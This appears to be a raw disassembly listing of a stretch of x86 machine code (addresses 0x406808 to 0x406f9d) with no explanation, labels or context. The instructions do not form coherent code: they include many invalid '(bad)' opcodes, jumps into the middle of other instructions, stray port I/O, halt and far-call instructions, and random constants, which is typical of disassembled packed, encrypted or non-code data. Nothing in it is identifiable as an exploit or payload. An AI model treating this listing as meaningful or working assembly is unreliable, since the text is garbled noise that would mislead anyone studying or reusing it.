  406808:	clc    
  406809:	pop    ss
  40680a:	ret    
  40680b:	sbb    DWORD PTR [edi-0x6f6985f3],ecx
  406811:	leave  
  406812:	dec    edx
  406813:	push   ecx
  406814:	sub    BYTE PTR [edi+0x10],0x27
  406818:	ds pop edx
  40681a:	or     esp,DWORD PTR [ebp*8+0x1f005eec]
  406821:	add    BYTE PTR [edi+0x57],bl
  406824:	ja     0x40688e
  406826:	mov    dl,0xb8
  406828:	ret    
  406829:	push   cs
  40682a:	xchg   esi,eax
  40682b:	add    eax,0xf02b607b
  406830:	or     ah,BYTE PTR [ecx]
  406832:	test   DWORD PTR [esi+0x7967121c],edx
  406838:	retf   0x4ff8
  40683b:	das    
  40683c:	or     eax,0xec73c90e
  406841:	inc    eax
  406842:	hlt    
  406843:	rol    BYTE PTR [esi-0x3f3dad67],cl
  406849:	dec    eax
  40684a:	je     0x4068c7
  40684c:	sbb    DWORD PTR [ebx],esp
  40684e:	xchg   edx,eax
  40684f:	xor    dh,BYTE PTR [eax]
  406851:	or     eax,0x9171943
  406856:	lods   al,BYTE PTR ds:[esi]
  406857:	dec    esi
  406858:	dec    edx
  406859:	xchg   edx,eax
  40685a:	or     eax,0xd521c0f7
  40685f:	xchg   ebx,eax
  406860:	test   al,0xd7
  406862:	je     0x406890
  406864:	fsubr  DWORD PTR [ecx-0x1d]
  406867:	xor    edi,ecx
  406869:	mov    bh,0x1a
  40686b:	mov    BYTE PTR [eax+0x2d],al
  40686e:	or     edx,esp
  406870:	add    BYTE PTR [eax-0x5ffadd14],cl
  406876:	dec    di
  406878:	xchg   ecx,eax
  406879:	loop   0x406844
  40687b:	xchg   ecx,eax
  40687c:	aas    
  40687d:	adc    al,0x7c
  40687f:	retf   0xf88e
  406882:	push   0xffffff81
  406884:	div    DWORD PTR [esi]
  406886:	push   ds
  406887:	pop    ebp
  406888:	pop    edi
  406889:	or     al,BYTE PTR [edi+ebp*2+0x46]
  40688d:	jne    0x40690a
  40688f:	int    0x48
  406891:	push   ds
  406892:	mov    DWORD PTR [ebp+0x17969ddf],esp
  406898:	dec    eax
  406899:	test   al,0x2a
  40689b:	and    ch,bl
  40689d:	cwde   
  40689e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40689f:	inc    ebx
  4068a0:	mov    ebx,0xe17d6596
  4068a5:	js     0x406882
  4068a7:	std    
  4068a8:	daa    
  4068a9:	mov    eax,ds:0x221d6194
  4068ae:	mov    bh,0x3b
  4068b0:	repz jae 0x40687c
  4068b3:	fldz   
  4068b5:	cmc    
  4068b6:	call   0x4abee7cc
  4068bb:	int3   
  4068bc:	sbb    ch,BYTE PTR [ebp+0x26]
  4068bf:	das    
  4068c0:	(bad)  
  4068c1:	mov    bl,0x6
  4068c3:	cli    
  4068c4:	or     BYTE PTR [edx+edi*8],dh
  4068c7:	mov    bl,0x12
  4068c9:	icebp  
  4068ca:	or     eax,0xa263b2f7
  4068cf:	mov    esp,0x73fa51b2
  4068d4:	push   esp
  4068d5:	jge    0x406858
  4068d7:	pop    edx
  4068d8:	xchg   ebx,eax
  4068d9:	cmc    
  4068da:	stc    
  4068db:	jbe    0x4068a9
  4068dd:	jle    0x4068d2
  4068df:	sbb    DWORD PTR [edx-0x1a],esi
  4068e2:	in     eax,dx
  4068e3:	enter  0x4255,0xd6
  4068e7:	cs aas 
  4068e9:	inc    ecx
  4068ea:	or     al,0x4b
  4068ec:	pop    ss
  4068ed:	sub    esi,0xd2fe77bc
  4068f3:	leave  
  4068f4:	enter  0xc25f,0x75
  4068f8:	lock pop ds
  4068fa:	gs (bad) 
  4068fd:	add    al,0x13
  4068ff:	retf   
  406900:	out    0x74,eax
  406902:	loop   0x406981
  406904:	shl    BYTE PTR ds:0x442bfa74,1
  40690a:	inc    edi
  40690b:	jmp    0x4068a0
  40690d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40690e:	xchg   DWORD PTR [ecx-0x71ea4a5d],ebp
  406914:	pop    edx
  406915:	adc    al,dh
  406917:	aas    
  406918:	cwde   
  406919:	lods   al,BYTE PTR ds:[esi]
  40691a:	adc    BYTE PTR ds:0x17fc3270,bh
  406920:	ins    DWORD PTR es:[edi],dx
  406921:	cmp    dh,ch
  406923:	mov    WORD PTR [edi],cs
  406925:	cdq    
  406926:	adc    bl,BYTE PTR [esi+ebp*8]
  406929:	jns    0x4068ae
  40692b:	xchg   ecx,eax
  40692c:	push   0x52
  40692e:	jl     0x4068ff
  406930:	xchg   ecx,eax
  406931:	(bad)  
  406932:	loop   0x40690d
  406934:	mov    dh,0x56
  406936:	add    al,0x44
  406938:	arpl   bx,bx
  40693a:	xor    al,0x63
  40693c:	outs   dx,DWORD PTR ds:[esi]
  40693d:	or     ch,BYTE PTR [eax]
  40693f:	add    edx,ebp
  406941:	xchg   ecx,eax
  406942:	or     al,0x63
  406944:	lds    esi,FWORD PTR [ebp-0x3d]
  406947:	sub    edi,esi
  406949:	dec    edi
  40694a:	sbb    bl,al
  40694c:	mov    eax,0x58e2b10b
  406951:	cmp    edi,esi
  406953:	(bad)  
  406954:	adc    ah,ch
  406956:	loop   0x406962
  406958:	lods   al,BYTE PTR ds:[esi]
  406959:	push   ecx
  40695a:	jnp    0x406971
  40695c:	inc    esp
  40695d:	ja     0x40690f
  40695f:	xchg   edx,eax
  406960:	xchg   edi,eax
  406961:	loop   0x406983
  406963:	push   esp
  406964:	sub    esp,eax
  406966:	stc    
  406967:	aaa    
  406968:	adc    BYTE PTR [ebx],ch
  40696a:	dec    ecx
  40696b:	imul   edi,DWORD PTR [ebx-0x52eefb5e],0x7
  406972:	dec    ebx
  406973:	inc    edi
  406974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406975:	add    DWORD PTR [edi+edi*2],edi
  406978:	ds push eax
  40697a:	sbb    al,0x95
  40697c:	mov    ds:0x1b85bc92,al
  406981:	out    0x72,al
  406983:	adc    al,0xf7
  406985:	cmp    BYTE PTR [ecx],0xd2
  406988:	adc    ebp,ebx
  40698a:	jge    0x406935
  40698c:	dec    eax
  40698d:	and    al,0xfa
  40698f:	xor    esp,ebp
  406991:	jbe    0x406971
  406993:	push   ebx
  406994:	jae    0x406a0f
  406996:	pop    di
  406998:	aas    
  406999:	and    al,0x2d
  40699b:	(bad)  
  40699c:	call   0x5a37a969
  4069a1:	scas   eax,DWORD PTR es:[edi]
  4069a2:	or     eax,0xb619708a
  4069a7:	jge    0x4069f5
  4069a9:	pop    edx
  4069aa:	addr16 adc eax,0xc54bcc25
  4069b0:	(bad)  
  4069b1:	pop    es
  4069b2:	fwait
  4069b3:	adc    cl,cl
  4069b5:	add    BYTE PTR [si+0x24be],bl
  4069ba:	jp     0x406957
  4069bc:	dec    edx
  4069bd:	push   ebx
  4069be:	xor    bl,cl
  4069c0:	ror    BYTE PTR [esi],0x5b
  4069c3:	int3   
  4069c4:	(bad)  
  4069c5:	retf   0x2cec
  4069c8:	and    BYTE PTR [edx+0x77],bh
  4069cb:	mov    esi,0x4359b14d
  4069d0:	js     0x4069b6
  4069d2:	sbb    DWORD PTR [ebp+ecx*1-0x7502fcc4],eax
  4069d9:	xchg   esi,eax
  4069da:	sbb    DWORD PTR [esi-0x28],0xffffffb7
  4069de:	mov    edi,0xb0f6748e
  4069e3:	outs   dx,DWORD PTR ds:[esi]
  4069e4:	inc    ecx
  4069e5:	mov    ebx,0xcf1eecf5
  4069ea:	sbb    al,0x68
  4069ec:	mov    eax,0x2d16dfd9
  4069f1:	loopne 0x406a50
  4069f3:	mov    fs,WORD PTR [ebx]
  4069f5:	jle    0x4069bc
  4069f7:	mov    esp,0xc81dcca8
  4069fc:	adc    ebx,ebx
  4069fe:	and    eax,0x3157b729
  406a03:	lds    ebx,FWORD PTR [ebx+0x20cdbe9b]
  406a09:	not    DWORD PTR [ebp+0x2f]
  406a0c:	loope  0x4069a5
  406a0e:	jne    0x4069b6
  406a10:	loopne 0x4069c4
  406a12:	add    eax,0x98e24c6d
  406a17:	mov    WORD PTR [ebx],es
  406a19:	in     eax,dx
  406a1a:	imul   ebp,DWORD PTR [edi+eiz*8-0x36ddd601],0x3
  406a22:	and    eax,0xc8b6da98
  406a27:	jmp    0x406a64
  406a29:	pop    ss
  406a2a:	retf   
  406a2b:	mov    dh,BYTE PTR [ebx]
  406a2d:	das    
  406a2e:	push   ebp
  406a2f:	dec    esi
  406a30:	loope  0x406a5e
  406a32:	(bad)  
  406a33:	mov    al,0xe
  406a35:	inc    eax
  406a36:	xor    DWORD PTR [esi+0x20],ecx
  406a39:	iret   
  406a3a:	loope  0x406a26
  406a3c:	xor    al,0x6e
  406a3e:	push   edi
  406a3f:	call   0x78c8:0xb7dbc4ea
  406a46:	xchg   edx,eax
  406a47:	mov    bh,0x61
  406a49:	aam    0x5b
  406a4b:	lea    eax,[eax]
  406a4d:	data16 add dh,BYTE PTR ds:0xd313c19a
  406a54:	pop    ecx
  406a55:	fs pop ds
  406a57:	sub    edi,DWORD PTR [eax*1+0x1b6abb49]
  406a5e:	fucomi st,st(2)
  406a60:	push   0xffffff81
  406a62:	mov    dh,bl
  406a64:	out    dx,al
  406a65:	in     eax,0x5f
  406a67:	xchg   ebp,eax
  406a68:	cmp    al,0xa
  406a6a:	outs   dx,DWORD PTR ds:[esi]
  406a6b:	push   esi
  406a6c:	and    eax,0xed0ad7ce
  406a71:	aam    0xd6
  406a73:	mov    ecx,0x97da8cb2
  406a78:	mov    ds:0xd04c2d11,eax
  406a7d:	inc    esi
  406a7e:	rcl    BYTE PTR [esi],1
  406a80:	push   0xffffffbd
  406a82:	cwde   
  406a83:	es adc al,0xf4
  406a86:	cmp    BYTE PTR [esp+ecx*4],al
  406a89:	ret    0x5b87
  406a8c:	les    ecx,FWORD PTR [edx+edx*4+0x4aca4184]
  406a93:	inc    edx
  406a94:	mov    ah,cl
  406a96:	push   ecx
  406a97:	lahf   
  406a98:	fsub   QWORD PTR [edx]
  406a9a:	hlt    
  406a9b:	pop    eax
  406a9c:	aam    0x42
  406a9e:	mov    BYTE PTR [esi-0x6a],dl
  406aa1:	push   ecx
  406aa2:	xor    BYTE PTR [esi+0x14],0x70
  406aa6:	adc    al,0xba
  406aa8:	inc    eax
  406aa9:	lds    esi,FWORD PTR [ebx]
  406aab:	ss call 0x1bca3969
  406ab1:	inc    ebp
  406ab2:	or     DWORD PTR [esp+esi*2-0x77],esi
  406ab6:	bound  ebx,QWORD PTR [ebx+0x6d]
  406ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aba:	push   ebp
  406abb:	xchg   ecx,eax
  406abc:	xor    cl,ah
  406abe:	xchg   ebx,eax
  406abf:	add    eax,0x8157a6d6
  406ac4:	ficom  WORD PTR [ecx-0x3c8717d6]
  406aca:	mov    ah,0x15
  406acc:	or     dh,BYTE PTR [eax-0x15]
  406acf:	xchg   esi,eax
  406ad0:	(bad)  
  406ad1:	and    al,0xf
  406ad3:	(bad)  
  406ad5:	mov    ds:0xd51a9576,al
  406ada:	pop    ds
  406adb:	pop    ebp
  406adc:	outs   dx,BYTE PTR ds:[esi]
  406add:	fwait
  406ade:	sub    al,0xcc
  406ae0:	or     esi,DWORD PTR [ebp-0x15aa6dd7]
  406ae6:	xor    DWORD PTR [eax-0x29],esp
  406ae9:	fcomip st,st(1)
  406aeb:	cs es jg 0x406add
  406aef:	(bad)  
  406af0:	loopne 0x406b1b
  406af2:	mov    bh,0x33
  406af4:	ret    0x54ea
  406af7:	stos   BYTE PTR es:[edi],al
  406af8:	loop   0x406b53
  406afa:	hlt    
  406afb:	ds cmp al,0x44
  406afe:	xor    DWORD PTR [edx-0x25],esp
  406b01:	loope  0x406aeb
  406b03:	addr16 pop ecx
  406b05:	shl    DWORD PTR [ecx+0x728ef945],1
  406b0b:	dec    ecx
  406b0c:	bound  esp,QWORD PTR [edx-0x655d132b]
  406b12:	lods   eax,DWORD PTR ds:[esi]
  406b13:	adc    eax,0x68f88e20
  406b18:	popf   
  406b19:	or     bh,BYTE PTR [ecx]
  406b1b:	or     bl,cl
  406b1d:	sub    al,0x8b
  406b1f:	push   edi
  406b20:	test   al,0x3e
  406b22:	scas   eax,DWORD PTR es:[edi]
  406b23:	or     al,0x61
  406b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b26:	mov    DWORD PTR [ebx],edx
  406b28:	xchg   ebx,eax
  406b29:	or     DWORD PTR [ebp+0x7dab5d85],ecx
  406b2f:	int    0x1f
  406b31:	push   0x23
  406b33:	mov    DWORD PTR [ebx-0x1],edi
  406b36:	nop
  406b37:	daa    
  406b38:	xor    ecx,DWORD PTR [edi+ecx*8]
  406b3b:	xchg   BYTE PTR [ebx],ch
  406b3d:	cdq    
  406b3e:	iret   
  406b3f:	out    0x80,al
  406b41:	ror    edx,1
  406b43:	sub    BYTE PTR [ebx-0x3609df8e],0x3c
  406b4a:	dec    ecx
  406b4b:	adc    edx,DWORD PTR [ecx-0x72c8c1d6]
  406b51:	(bad)  
  406b52:	mov    ds:0xcb013ed2,al
  406b57:	aam    0x62
  406b59:	ins    BYTE PTR es:[edi],dx
  406b5a:	inc    ebp
  406b5b:	and    DWORD PTR [ebx-0xfdd5e64],ebp
  406b61:	scas   al,BYTE PTR es:[edi]
  406b62:	inc    esp
  406b63:	and    al,BYTE PTR [esi-0x1b32e5ad]
  406b69:	jp     0x406b7a
  406b6b:	or     BYTE PTR [ecx],0x68
  406b6e:	ja     0x406bc3
  406b70:	mov    ecx,0x5209b20a
  406b75:	lea    edx,[ebx-0x49]
  406b78:	sub    BYTE PTR ds:0x17a31c30,bh
  406b7e:	mov    esi,0x40f2e61
  406b83:	mov    bh,ah
  406b85:	nop
  406b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b87:	shl    DWORD PTR [bx+di],0x9a
  406b8b:	push   ss
  406b8c:	push   cs
  406b8d:	jecxz  0x406b81
  406b8f:	sub    bh,ch
  406b91:	lods   al,BYTE PTR ds:[esi]
  406b92:	mov    al,0x3d
  406b94:	and    al,0x76
  406b96:	jmp    0x621a:0x465fbeb0
  406b9d:	xchg   ebp,eax
  406b9e:	inc    ebp
  406b9f:	ins    DWORD PTR es:[edi],dx
  406ba0:	jbe    0x406b94
  406ba2:	adc    BYTE PTR [edi+0x3f83ec7e],bh
  406ba8:	mov    ebx,0x8bdcbd5b
  406bad:	sub    cl,BYTE PTR [esi]
  406baf:	ror    BYTE PTR [ecx],1
  406bb1:	inc    ebx
  406bb2:	mov    edx,0x145363d2
  406bb7:	mov    es,WORD PTR [ebx-0x3a01b86c]
  406bbd:	fild   QWORD PTR [edx+0x4d]
  406bc0:	jg     0x406c1c
  406bc2:	xor    BYTE PTR [ecx-0xf],dh
  406bc5:	cli    
  406bc6:	adc    al,0x48
  406bc8:	inc    esi
  406bc9:	fisttp QWORD PTR [edi+0x249908a2]
  406bd0:	arpl   WORD PTR [ebp+0x78],ax
  406bd3:	or     al,0xb0
  406bd5:	(bad)  
  406bd6:	dec    esp
  406bd7:	and    eax,0x43406e3c
  406bdc:	mov    edx,0xd10cfa15
  406be1:	jmp    0x406b74
  406be3:	jle    0x406b68
  406be5:	int    0xb0
  406be7:	sbb    BYTE PTR [ebx],dh
  406be9:	add    DWORD PTR [ecx-0x7b],0xc5378e62
  406bf0:	mov    ah,0xdd
  406bf2:	xchg   BYTE PTR [ebx+0xb],cl
  406bf5:	ror    DWORD PTR [esi],cl
  406bf7:	loopne 0x406ba4
  406bf9:	pop    ss
  406bfa:	jge    0x406b92
  406bfc:	sbb    ebp,DWORD PTR [edi+0x35]
  406bff:	pop    es
  406c00:	lea    ebp,[esi-0xfee219d]
  406c06:	je     0x406bc7
  406c08:	stc    
  406c09:	jae    0x406bd0
  406c0b:	js     0x406bf4
  406c0d:	pop    esi
  406c0e:	mov    ch,0x3c
  406c10:	fcom   DWORD PTR [eax-0x2a082fce]
  406c16:	jmp    0x3a9ff93e
  406c1b:	sti    
  406c1c:	dec    esp
  406c1d:	lods   eax,DWORD PTR ds:[esi]
  406c1e:	addr16 inc ecx
  406c20:	jl     0x406bc2
  406c22:	mov    ds:0xb3968a54,al
  406c27:	fwait
  406c28:	jge    0x406c92
  406c2a:	adc    al,0x95
  406c2c:	jle    0x406c02
  406c2e:	imul   edx,DWORD PTR [esi+edx*1-0x13070ed5],0x7b9acbb5
  406c39:	(bad)  
  406c3a:	into   
  406c3b:	sub    eax,0xa27b6e3f
  406c40:	addr16 push ecx
  406c42:	xchg   DWORD PTR [ebp-0x1b],ecx
  406c45:	rcr    DWORD PTR [ecx],cl
  406c47:	ret    0xbe47
  406c4a:	lods   eax,DWORD PTR ds:[esi]
  406c4b:	lahf   
  406c4c:	push   ebp
  406c4d:	push   ebx
  406c4e:	js     0x406bdf
  406c50:	pop    ds
  406c51:	into   
  406c52:	pop    esi
  406c53:	pop    eax
  406c54:	mov    cl,cl
  406c56:	outs   dx,DWORD PTR ds:[esi]
  406c57:	sbb    eax,0xdcc1abf9
  406c5c:	and    DWORD PTR [eax+0x2c08170],eax
  406c62:	mov    BYTE PTR [eax+0x76],dh
  406c65:	outs   dx,BYTE PTR ds:[esi]
  406c66:	sbb    BYTE PTR [ebx-0x4e16aa41],ch
  406c6c:	imul   esp,DWORD PTR [edi-0x1],0xe0f2b842
  406c73:	cdq    
  406c74:	add    cl,BYTE PTR [edi]
  406c76:	lea    ebp,[edx]
  406c78:	mov    ecx,0xf4e24616
  406c7d:	push   ds
  406c7e:	mov    eax,0xbbcc8d59
  406c83:	pop    edx
  406c84:	sub    eax,0xa7c6bb74
  406c89:	mov    eax,ds:0x44b4dd02
  406c8e:	rol    DWORD PTR [esi+edi*4],1
  406c91:	mov    ch,0x84
  406c93:	xchg   esp,eax
  406c94:	or     al,0x5a
  406c96:	mov    bl,0x31
  406c98:	outs   dx,BYTE PTR ds:[esi]
  406c99:	add    eax,0xd82ac9f7
  406c9e:	add    ebp,DWORD PTR [edi+0x2c317b18]
  406ca4:	daa    
  406ca5:	push   ebx
  406ca6:	retf   0x88c1
  406ca9:	add    eax,ebx
  406cab:	push   0xffffffb1
  406cad:	jge    0x406cb1
  406caf:	push   edi
  406cb0:	xor    edi,esp
  406cb2:	inc    ebx
  406cb3:	ss ret 0x47ad
  406cb7:	or     al,bh
  406cb9:	dec    edi
  406cba:	cmp    DWORD PTR [edi-0x10],ecx
  406cbd:	shl    edx,1
  406cbf:	ins    DWORD PTR es:[edi],dx
  406cc0:	push   ss
  406cc1:	and    al,0xd3
  406cc3:	(bad)
  406cc6:	dec    esp
  406cc7:	and    DWORD PTR [ebx-0x5e],edx
  406cca:	(bad)  
  406ccc:	and    BYTE PTR [esi+0x9c1f0e7],bh
  406cd2:	lock push edi
  406cd4:	mov    eax,0xf743e899
  406cd9:	outs   dx,BYTE PTR ds:[esi]
  406cda:	mov    al,0xe4
  406cdc:	sub    ah,al
  406cde:	aaa    
  406cdf:	aam    0xc8
  406ce1:	aaa    
  406ce2:	jo     0x406c8e
  406ce4:	cmp    DWORD PTR [esi],eax
  406ce6:	dec    ebp
  406ce7:	loop   0x406d5a
  406ce9:	div    DWORD PTR [ecx]
  406ceb:	ins    BYTE PTR es:[edi],dx
  406cec:	sti    
  406ced:	clc    
  406cee:	push   esi
  406cef:	xchg   ecx,eax
  406cf0:	out    dx,eax
  406cf1:	sub    al,0xf3
  406cf3:	das    
  406cf4:	mov    eax,ds:0x76e1e698
  406cf9:	lods   al,BYTE PTR ds:[esi]
  406cfa:	mov    al,0xc1
  406cfc:	mov    esp,0xf3337dab
  406d01:	pusha  
  406d02:	imul   edi,DWORD PTR [ebx+0x35cd31c7],0x5d
  406d09:	mov    bh,0x40
  406d0b:	fld    QWORD PTR [ebx-0x57e04236]
  406d11:	ret    
  406d12:	mov    ecx,0xcf9be165
  406d17:	or     eax,0x74babcc3
  406d1c:	scas   eax,DWORD PTR es:[edi]
  406d1d:	rcl    eax,1
  406d1f:	loop   0x406d2a
  406d21:	sbb    BYTE PTR [ebx],0x44
  406d24:	xchg   DWORD PTR [eax+0x2680b374],ebx
  406d2a:	icebp  
  406d2b:	fidiv  DWORD PTR [eax+eax*2]
  406d2e:	fcomp  QWORD PTR gs:[edi]
  406d31:	mov    ebx,0x171425dc
  406d36:	mov    bl,0x64
  406d38:	loope  0x406cbb
  406d3a:	(bad)  
  406d3b:	sub    esi,edx
  406d3d:	cld    
  406d3e:	dec    esp
  406d3f:	repnz pop es
  406d41:	jmp    0x4d52da2c
  406d46:	push   ecx
  406d47:	and    ch,BYTE PTR ds:0x858f217c
  406d4d:	imul   esi,esp,0xf31fa501
  406d53:	add    DWORD PTR [edi+0x77],ebp
  406d56:	inc    edi
  406d57:	jle    0x406d40
  406d59:	add    BYTE PTR [esi],dh
  406d5b:	loopne 0x406d3b
  406d5d:	adc    BYTE PTR [eax-0xb],ch
  406d60:	push   0x3cfc9bc9
  406d65:	aad    0xc7
  406d67:	xor    eax,0xdaead40a
  406d6c:	cs pop ss
  406d6e:	push   cs
  406d6f:	into   
  406d70:	xchg   edi,eax
  406d71:	sub    eax,0x4f34945f
  406d77:	dec    esp
  406d78:	dec    ebx
  406d79:	xchg   edx,eax
  406d7a:	jecxz  0x406dc6
  406d7c:	shr    BYTE PTR [bp-0x3],cl
  406d80:	imul   ebp
  406d82:	push   0x7d
  406d84:	add    eax,0xdc6c2f60
  406d89:	inc    esp
  406d8a:	adc    bl,BYTE PTR [ecx-0x4c27eda7]
  406d90:	fstp   DWORD PTR [ebx]
  406d92:	pusha  
  406d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d94:	imul   ecx,DWORD PTR [edi+esi*4-0xe01730c],0x57
  406d9c:	stos   BYTE PTR es:[edi],al
  406d9d:	mov    eax,ds:0xa4495fca
  406da2:	cs inc edx
  406da4:	mov    ebp,0xadecfe84
  406da9:	jnp    0x406d42
  406dab:	stos   BYTE PTR es:[edi],al
  406dac:	(bad)  
  406dad:	fld    st(3)
  406daf:	push   ebx
  406db0:	pop    es
  406db1:	outs   dx,DWORD PTR ds:[esi]
  406db2:	lds    esp,FWORD PTR [esi]
  406db4:	xstore-rng (bad)
  406db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406db6:	les    ecx,FWORD PTR ds:0xe3d23137
  406dbc:	inc    eax
  406dbd:	clc    
  406dbe:	mov    bl,0xd7
  406dc0:	jns    0x406dd6
  406dc2:	les    ebp,FWORD PTR ds:0xaa586800
  406dc8:	pop    esi
  406dc9:	mov    ecx,0x77f3c611
  406dce:	xchg   edi,eax
  406dcf:	jae    0x406e2a
  406dd1:	loopne 0x406e0e
  406dd3:	adc    al,0x53
  406dd5:	pop    ds
  406dd6:	cmp    al,0x36
  406dd8:	fldenv [ebx-0x564acc7b]
  406dde:	test   DWORD PTR [ebp+eax*8+0x195b0e4c],ecx
  406de5:	fs in  eax,dx
  406de7:	sbb    ecx,DWORD PTR [ebx+0x19]
  406dea:	pop    eax
  406deb:	test   DWORD PTR [ebx-0x7377cb4],0xec0e07d6
  406df5:	aas    
  406df6:	outs   dx,BYTE PTR ds:[esi]
  406df7:	mov    dh,0xfe
  406df9:	pop    es
  406dfa:	shl    DWORD PTR [ebx],0xaa
  406dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dfe:	dec    cx
  406e00:	push   edx
  406e01:	out    dx,al
  406e02:	xor    BYTE PTR [edx+0x6035d576],al
  406e08:	aad    0x2c
  406e0a:	adc    BYTE PTR [ebp+0x19],ah
  406e0d:	push   ecx
  406e0e:	cmc    
  406e0f:	out    0xb4,al
  406e11:	mov    DWORD PTR [ebx+esi*4-0x75d00afa],eax
  406e18:	sahf   
  406e19:	not    edx
  406e1b:	push   ss
  406e1c:	adc    al,0xec
  406e1e:	mov    bl,0xb1
  406e20:	mov    esi,0x373b7a44
  406e25:	test   eax,0x7df18517
  406e2a:	nop
  406e2b:	gs out 0x96,eax
  406e2e:	push   esi
  406e2f:	sti    
  406e30:	je     0x406e4c
  406e32:	imul   ecx,DWORD PTR [ebp-0x5700f5a2],0x5d
  406e39:	fdiv   QWORD PTR [esi-0x47]
  406e3c:	sbb    dh,ah
  406e3e:	shl    BYTE PTR [ecx+0x2a],cl
  406e41:	jae    0x406e11
  406e43:	jo     0x406ea1
  406e45:	data16 mov bh,0x19
  406e48:	mov    dh,0x14
  406e4a:	and    al,0x11
  406e4c:	dec    edx
  406e4d:	fldcw  WORD PTR [esi+0x16ba9e2]
  406e53:	test   edx,edi
  406e55:	mov    BYTE PTR [ecx-0xb],ch
  406e58:	dec    eax
  406e59:	(bad)  
  406e5b:	sub    BYTE PTR [ebp-0x3],al
  406e5e:	scas   eax,DWORD PTR es:[edi]
  406e5f:	stos   DWORD PTR es:[edi],eax
  406e60:	mov    ch,0x27
  406e62:	adc    eax,0xb71bf2f2
  406e67:	inc    ebx
  406e68:	clc    
  406e69:	retf   
  406e6a:	lods   al,BYTE PTR ds:[esi]
  406e6b:	sub    esi,DWORD PTR [eax+eax*4+0x24b7cf67]
  406e72:	add    ah,dl
  406e74:	mov    ch,0x13
  406e76:	pop    edi
  406e77:	push   ecx
  406e78:	je     0x406e69
  406e7a:	fcmovu st,st(6)
  406e7c:	jg     0x406ed2
  406e7e:	pop    edx
  406e7f:	inc    esi
  406e80:	cmp    esi,ebx
  406e82:	call   0xfdd0d02e
  406e87:	or     DWORD PTR [edi+0x6482e72],ebp
  406e8d:	mov    ds:0x54259dc9,al
  406e92:	inc    DWORD PTR [ecx-0x2e1daa47]
  406e98:	push   edi
  406e99:	call   0xe2487c7f
  406e9e:	inc    esp
  406e9f:	inc    ebx
  406ea0:	sub    DWORD PTR [eax+ebx*4+0x5b],ebp
  406ea4:	test   BYTE PTR [edx],0x68
  406ea7:	mov    esp,0x6ff412bd
  406eac:	jecxz  0x406eaa
  406eae:	xlat   BYTE PTR ds:[ebx]
  406eaf:	jns    0x406ead
  406eb1:	pushf  
  406eb2:	sbb    bl,bl
  406eb4:	or     bl,ch
  406eb6:	sti    
  406eb7:	and    DWORD PTR [ecx],ebx
  406eb9:	mov    bl,0x3c
  406ebb:	mov    ds:0xf3b5056,eax
  406ec0:	imul   BYTE PTR [ebx+0x7af9bced]
  406ec6:	xor    ebp,DWORD PTR [eax+ecx*8-0xe4d7b0a]
  406ecd:	pop    ebx
  406ece:	cmp    ch,ch
  406ed0:	push   ss
  406ed1:	sub    BYTE PTR [ecx],ah
  406ed3:	pop    es
  406ed4:	xor    dl,BYTE PTR [ecx+edx*2+0x3ad6bbcc]
  406edb:	mov    ebp,0xce4089d5
  406ee0:	dec    ebx
  406ee1:	push   es
  406ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ee3:	mov    edi,0x1ea47d4a
  406ee8:	push   es
  406ee9:	add    BYTE PTR [ecx-0x72],al
  406eec:	and    BYTE PTR [edi+0x16],ah
  406eef:	pop    eax
  406ef0:	ds fwait
  406ef2:	sbb    al,0x94
  406ef4:	das    
  406ef5:	fcom   DWORD PTR [ecx-0x31422d2e]
  406efb:	stos   DWORD PTR es:[edi],eax
  406efc:	mov    bh,0xb5
  406efe:	cmp    eax,ebp
  406f00:	jl     0x406f46
  406f02:	das    
  406f03:	dec    esi
  406f04:	js     0x406ee0
  406f06:	clc    
  406f07:	mov    al,0xfd
  406f09:	pop    esi
  406f0a:	(bad)  
  406f0c:	fdivr  st,st(7)
  406f0e:	in     eax,0x57
  406f10:	bound  eax,QWORD PTR [ecx-0x48]
  406f13:	mov    bl,0x8
  406f15:	mov    bl,0x84
  406f17:	jecxz  0x406f11
  406f19:	jne    0x406eab
  406f1b:	dec    ebx
  406f1c:	aas    
  406f1d:	xor    BYTE PTR [edx-0x46240b41],bh
  406f23:	shl    DWORD PTR [esi-0x6f],1
  406f26:	cmp    al,BYTE PTR [ebp+0x66ee9e9a]
  406f2c:	loop   0x406f06
  406f2e:	fxch   st(0)
  406f30:	and    dh,BYTE PTR [edx-0x2b]
  406f33:	sbb    al,0xbb
  406f35:	out    dx,al
  406f36:	mov    ds:0xa79b3a70,al
  406f3b:	cli    
  406f3c:	sbb    dh,BYTE PTR [edx]
  406f3e:	jmp    0x406ecf
  406f40:	and    DWORD PTR [eax+0x75420d33],0xffffffe0
  406f47:	mov    es,WORD PTR [edx+0x72724c7c]
  406f4d:	push   eax
  406f4e:	cld    
  406f4f:	mov    bh,0x54
  406f51:	and    al,0x19
  406f53:	and    DWORD PTR ss:[esi-0x26],edx
  406f57:	push   ecx
  406f58:	sub    esi,DWORD PTR [eax-0x207284cd]
  406f5e:	hlt    
  406f5f:	jge    0x406f92
  406f61:	out    dx,al
  406f62:	sbb    ebp,ebp
  406f64:	ret    0x8930
  406f67:	cmp    DWORD PTR ds:0x7ee2c243,edx
  406f6d:	cmp    edx,ecx
  406f6f:	ins    DWORD PTR es:[edi],dx
  406f70:	sub    ch,BYTE PTR [eax]
  406f72:	xchg   edi,eax
  406f73:	dec    esp
  406f74:	jne    0x406f11
  406f76:	mov    cs,WORD PTR [eax+0x756659a6]
  406f7c:	xchg   esp,eax
  406f7d:	lahf   
  406f7e:	sahf   
  406f7f:	ins    DWORD PTR es:[edi],dx
  406f80:	fstp   QWORD PTR [ebp-0x35]
  406f83:	retf   
  406f84:	enter  0xb93f,0x99
  406f88:	lea    edi,[ecx-0x11]
  406f8b:	test   al,0xf7
  406f8d:	push   edx
  406f8e:	sbb    ah,dh
  406f90:	pop    edi
  406f91:	clc    
  406f92:	int3   
  406f93:	push   0xffffffc6
  406f95:	lea    edi,[ebp+esi*4+0x65]
  406f99:	and    DWORD PTR [esi-0x3f],esp
  406f9c:	inc    edi
  406f9d:	pop    ecx
